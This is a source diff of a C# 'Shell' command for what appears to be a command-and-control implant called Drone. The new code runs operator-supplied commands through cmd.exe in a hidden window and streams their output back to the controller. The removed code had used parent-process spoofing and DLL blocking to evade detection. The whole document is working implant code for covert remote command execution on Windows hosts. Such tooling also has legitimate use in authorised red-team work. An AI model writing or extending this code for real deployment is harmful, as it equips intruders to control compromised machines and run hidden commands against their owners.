@@ -1,25 +1,62 @@
-﻿using System.Threading;
-using System.Threading.Tasks;
-
-using Drone.Models;
-using Drone.Utilities;
+﻿using System;
+using System.Diagnostics;
+using System.Threading;
 
 namespace Drone.Commands;
 
 public sealed class Shell : DroneCommand
 {
-    public override byte Command => 0x0D;
-    
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
+    public override byte Command => 0x3A;
+    public override bool Threaded => true;
+
+    public override void Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var ppid = Drone.Config.Get<int>(Setting.ParentPid);
-        var blockDlls = Drone.Config.Get<bool>(Setting.BlockDlls);
+        using var process = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = @"C:\Windows\System32\cmd.exe",
+                Arguments = $"/c {string.Join(" ", task.Arguments)}",
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false
+            }
+        };
+
+        // inline function
+        void OnDataReceived(object sender, DataReceivedEventArgs e)
+        {
+            Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, e.Data + Environment.NewLine));
+        }
         
-        var spawner = new ProcessSpawner(ppid, blockDlls);
+        // send output on data received
+        process.OutputDataReceived += OnDataReceived;
+        process.ErrorDataReceived += OnDataReceived;
 
-        var command = $"C:\\Windows\\System32\\cmd.exe /c {string.Join(" ", task.Arguments)}";
-        var output = spawner.SpawnAndReadProcess(command);
+        process.Start();
+        process.BeginOutputReadLine();
+        process.BeginErrorReadLine();
+        
+        // send a task running
+        Drone.SendTaskRunning(task.Id);
+        
+        // don't use WaitForExit
+        while (!process.HasExited)
+        {
+            // has the token been cancelled?
+            if (cancellationToken.IsCancellationRequested)
+            {
+                process.OutputDataReceived -= OnDataReceived;
+                process.ErrorDataReceived -= OnDataReceived;
+                
+                break;
+            }
+            
+            Thread.Sleep(100);
+        }
 
-        await Drone.SendOutput(task, output);
+        Drone.SendTaskComplete(task.Id);
     }
 }
